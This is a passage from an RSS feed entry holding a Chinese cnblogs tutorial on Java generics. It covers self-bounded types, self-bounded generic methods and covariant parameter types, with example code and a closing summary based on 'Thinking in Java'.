//The type D is not a valid substitute for the bounded parameter &amp;lt;T extends SelfBounded&amp;lt;T&amp;gt;&amp;gt; of the type SelfBounded&amp;lt;T&amp;gt;
class D{}
//class E extends SelfBounded&amp;lt;D&amp;gt;{}

class F extends SelfBounded{}

public class SelfBounding {
    public static void main(String[] args) {
        A a = new A();
        a.set(new A());
        a = a.set(new A()).get();
        a = a.get();
        C c = new C();
        c = c.setAndGet(new C());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;自限定要求的就是在继承关系中，像下面这样使用这个类&lt;/strong&gt;：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class A　extends SelfBouned&amp;lt;A&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么我们又想知道自限定的参数有什么作用呢？&lt;/p&gt;
&lt;p&gt;&lt;span&gt;它可以保证参数类型必须与正在被定义的类相同！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我们从代码中可以看出虽然可以使用，B虽然可以继承从SelfBounded导出的A，但是B类中的类型参数都是为A类。A类的那种继承为最常用的用法。对E类进行定义说明不能使用不是SelfBounded的类型参数。F可以编译，不会有任何警告，说明自限定惯用法不是可强制执行的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304204421288-702195655.png&quot; width=&quot;600&quot; height=&quot;200&quot;/&gt;&lt;/p&gt;
&lt;p&gt;自限定类型只能强制作用于继承关系，如果使用了自限定，就应该了解这个类的所有类型参数将与使用这个参数的类具有相同类型。即类型参数与类具有相同类型。&lt;/p&gt;
&lt;p&gt;还可以将自限定用于泛型方法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class SelfBoundingMethods{
    static &amp;lt;T extends SelfBounded&amp;lt;T&amp;gt;&amp;gt; T f(T arg){
        return arg.set(arg).get();
    }
    public static void main(String args[]){
        A a = f(new A());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这可以放置这个方法被应用于除以上形式的自限定类型参数之外的任何事物上。&lt;/p&gt;
&lt;h3 id=&quot;参数协变&quot;&gt;参数协变&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;自限定类型的价值在于：可以产生协变参数类型（方法参数类型会随着子类而变化）&lt;/strong&gt;。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class GenericGetter&amp;lt;T extends GenericGetter&amp;lt;T&amp;gt;&amp;gt;{
    T element;
    void set(T element) { this.element = element; }
    T get() { return element; }
}

class Getter extends GenericGetter&amp;lt;Getter&amp;gt;{
}

public class GenericAndReturnTypes {
    static void test(Getter g) {
        Getter result = g.get();
        GenericGetter genericGetter = g.get();
    }
    
    public static void main(String[] args) {
        Getter getter = new Getter();
        test(getter);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是在非泛型代码中，参数类型却不可以随子类变化而变化。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Base{}
class Derived extends Base{}

class OrdinarySetter{
    void set(Base base) {
        System.out.println(&quot;OrdinarySetter.set(Base)&quot;);
    }
}

class DerivedSetter extends OrdinarySetter{
    void set(Derived derived) {
        System.out.println(&quot;DerivedSetter.set(Derived)&quot;);
    }
}

public class OrdinaryArguments {
    public static void main(String[] args) {
        Base base = new Base();
        Derived derived = new Derived();
        DerivedSetter ds = new DerivedSetter();
        
        ds.set(base);
        ds.set(derived);
    }
}
/*
output:
OrdinarySetter.set(Base)
DerivedSetter.set(Derived)
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ds.set(base);和ds.set(derived);都可以可以的，是因为DerivedSetter.set()没有重写OrdinarySetter.set()中的方法，而是重载了。于是DerivedSetter中含有两个set方法。ds.set(base);调用的是父类OrdinarySetter的set的。&lt;/p&gt;
&lt;p&gt;但是使用自限定类型，在导出类中就只会有一个方法，并且这个方法接受导出类型而不是基类型为参数！！！&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;interface SelfBoundSetter&amp;lt;T extends SelfBoundSetter&amp;lt;T&amp;gt;&amp;gt;{
    void set(T arg);
}

interface Setter extends SelfBoundSetter&amp;lt;Setter&amp;gt;{}

public class SelfBoundingAndCovariantAruguments {
    void test(Setter s1, Setter s2, SelfBoundSetter sbs) {
        s1.set(s2);
        //The method set(Setter) in the type SelfBoundSetter&amp;lt;Setter&amp;gt; 
        //is not applicable for the arguments (SelfBoundSetter)
        //s1.set(sbs);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;若是使用了自限定类型，基类型就不可以传入到子类型方法中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304204553061-2036473755.png&quot; width=&quot;600&quot; height=&quot;400&quot;/&gt;&lt;/p&gt;
&lt;p&gt;若是不使用自限定类型，而使用普通泛型，则子类中就是重载基类的方法，结果就像在OrdinaryArguments.java中一样。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304204619084-1494212566.png&quot; width=&quot;600&quot; height=&quot;400&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看出不使用自限定类型将重载参数，使用自限定类型将只能获得方法的一个版本，它将接受确切的参数类型。&lt;/p&gt;
&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;p&gt;在看过《Java编程思想》对Java泛型的介绍后，总结了以上的内容。再次总体回顾，感觉到Java中的泛型还是有很多不足的。毕竟Java语言也不是一开始就有泛型，而且引入了泛型之后还有兼顾以前的旧代码。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;于是泛型的实现原理就是在运行时将实际类型擦除为指定的第一个边界类型（未指定则擦除为Object），从而应用于多个类型。&lt;/li&gt;
&lt;li&gt;擦除的代价也是显著的，不能用于显示地引用运行时类型信息的操作之中，例如转型、instanceof操作和new表达式。&lt;/li&gt;
&lt;li&gt;然后介绍了类型擦除的补偿，可以指定类型标签，让泛型类知道确切类型&lt;/li&gt;
&lt;li&gt;最后又总结了边界、通配符、自限定类型的含义以及用法&lt;/li&gt;
&lt;li&gt;还有一个文中没有提到但是要知道的：不能不捕获泛型类型的异常，因为在编译时和运行时都必须要知道异常的确切类型，泛型类也不能直接或者间接继承Throwable，阻止定义不能捕获的泛型异常。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;《Java编程思想》第四版&lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 13:27:00 +0000</pubDate>
<dc:creator>SakuraOne</dc:creator>
<og:description>前言 一般的类和方法，使用的都是具体的类型：基本类型或者自定义的类。如果我们要编写出适用于多种类型的通用代码，那么肯定就不能使用具体的类型。前面我们介绍过 '多态' ，多态算是一种泛化机制，但是也会拘</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/myworld7/p/10473312.html</dc:identifier>
</item>
</channel>
</rss>